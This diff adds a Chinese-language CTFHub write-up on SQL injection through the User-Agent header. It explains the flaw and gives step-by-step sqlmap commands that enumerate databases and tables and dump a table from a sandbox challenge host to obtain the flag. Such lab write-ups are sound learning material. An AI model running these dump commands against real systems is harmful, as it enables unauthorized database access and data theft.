@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SQL注入UA注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SQL注入UA注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.25 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SQL注入, UA注入, User-Agent, SQLmap</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SQL注入 / UA注入</li>
+        <li><strong>题目名称：</strong>UA注入</li>
+        <li><strong>环境：</strong>通过 Open Browser 打开外部浏览器访问靶场环境。</li>
+        <li><strong>目标：</strong>注入点隐藏在 HTTP 请求头的 <code>User-Agent</code> 字段中。需要配合 SQLmap 工具，指定 UA 头部作为注入位置，最终获取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>什么是 UA 注入？</strong></p>
+    <p>UA（User-Agent）注入，是 HTTP 请求头注入的一种。在之前的关卡中，注入点都在 URL 参数（如 <code>?id=1</code>）或 Cookie 里。但在真实开发中，后端代码有时会记录用户的访问信息，比如将浏览器的 UA 头写入数据库。如果代码直接将 <code>User-Agent</code> 拼接到 SQL 语句中而未做过滤，就会形成漏洞。</p>
+    <p><strong>与之前注入的核心不同点：</strong></p>
+    <ul>
+        <li><strong>注入位置：</strong>不在 URL，也不在 Cookie，而是藏在 <code>User-Agent</code> 请求头里。</li>
+        <li><strong>工具操作：</strong>因为浏览器无法修改 UA 请求头，所以必须依靠 SQLmap 的 <code>--user-agent</code> 参数，配合星号 <code>*</code> 来指定注入位置。</li>
+        <li><strong>特征暴露：</strong>靶场页面上会直接回显拼接后的 SQL 语句，比如 <code>select * from news where id=Mozilla/5.0...</code>。由于浏览器自带的 UA 含有空格和括号，会导致 SQL 语法崩溃，这也反向证明了该处存在整数型注入。</li>
+    </ul>
+
+    <div class="diff-box">
+        <strong>SQLmap 操作：</strong>
+        <ul>
+            <li><code>python sqlmap.py</code>：运行 SQLmap 主程序。</li>
+            <li><code>-u "URL"</code>：指定目标 URL。这里只需要填靶场的基地址（如 <code>http://challenge-xxx.sandbox.ctfhub.com:10800/</code>）。</li>
+            <li><code>--user-agent="1*"</code>：<strong>本关核心参数</strong>。将 User-Agent 请求头指定为 <code>1*</code>，其中星号 <code>*</code> 是 SQLmap 的注入点标记，告诉工具将后续的 Payload 全部替换到星号的位置进行测试。</li>
+            <li><code>--dbs</code>：查询目标服务器上的所有数据库名。</li>
+            <li><code>-D "sqli"</code>：指定目标数据库名为 <code>sqli</code>（前面查到的结果）。</li>
+            <li><code>-T "jhivrcrzmo"</code>：指定目标表名为 <code>jhivrcrzmo</code>（前面查到的随机表名）。</li>
+            <li><code>--dump</code>：导出数据。自动查字段名并输出表内所有数据，这是拿 Flag 的关键步骤。</li>
+            <li><code>--batch</code>：全自动模式，遇到询问默认选 Yes，无需人工干预。</li>
+            <li><code>--threads=1</code>：强制单线程，降低请求频率，防止靶场环境崩溃。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：探测注入点与库名</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>python sqlmap.py -u "http://challenge-7e693e1f5a0f3228.sandbox.ctfhub.com:10800/" --user-agent="1*" --dbs --batch --threads=1</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>测试 UA 头部是否存在 SQL 注入，并利用 <code>--dbs</code> 获取所有数据库名。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>成功跑出 <code>information_schema</code>、<code>mysql</code>、<code>performance_schema</code> 和 <code>sqli</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认注入成功，当前目标数据库为 <strong><code>sqli</code></strong>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：查表名</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>python sqlmap.py -u "http://challenge-7e693e1f5a0f3228.sandbox.ctfhub.com:10800/" --user-agent="1*" -D "sqli" --tables --batch --threads=1</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>获取 <code>sqli</code> 库下的所有表名。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>列出 <code>news</code> 和随机表名 <code>jhivrcrzmo</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认目标表名为 <strong><code>jhivrcrzmo</code></strong>，<code>news</code> 为干扰项。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：一键脱库拿 Flag</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>python sqlmap.py -u "http://challenge-7e693e1f5a0f3228.sandbox.ctfhub.com:10800/" --user-agent="1*" -D "sqli" -T "jhivrcrzmo" --dump --batch --threads=1</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">执行目的：</span>指定库名和表名，使用 <code>--dump</code> 自动猜测字段名并导出表内全部数据。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>终端打印数据表，输出 <code>ctfhub{...}</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>成功提取 Flag，提交至 CTFHub，通关成功。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：UA头部无法直接通过浏览器操作。</strong>必须借助外部工具（如 BP 抓包或 SQLmap 参数）进行修改。</li>
+        <li><strong>坑2：SQLmap 参数配置。</strong><code>--user-agent="1*"</code> 中的星号 <code>*</code> 是告诉 SQLmap“注入点在这里”的核心标记。漏掉星号或填错格式，工具就无法正确识别注入点。</li>
+        <li><strong>坑3：环境脆弱与超时。</strong>CTFHub 靶场承受高并发能力极弱，使用 SQLmap 时必须加上 <code>--threads=1</code>。如果连接被强制关闭，重启环境并重新执行命令即可，这不是 Payload 问题。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>注入点位置的多样性：</strong>除了 URL 参数、Cookie，User-Agent、Referer、X-Forwarded-For 等 HTTP 请求头都可能成为注入点。遇到这类题目，核心思路是使用带 <code>*</code> 标记的 SQLmap 命令（如 <code>--user-agent="*"</code>）指向目标头部。</li>
+        <li><strong>SQLmap 核心参数回顾：</strong>熟记 <code>-u</code> (URL)、<code>--dbs</code> (库)、<code>-D</code> (指定库)、<code>--tables</code> (表)、<code>-T</code> (指定表)、<code>--dump</code> (导出数据)。</li>
+        <li><strong>实战操作认知：</strong>在遇到“非标准位置”注入时，手工测试容易被 WAF 拦截或语法错误卡住，使用自动化工具（配合精准的注入点标记 <code>*</code>）是效率最高的破局方式。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
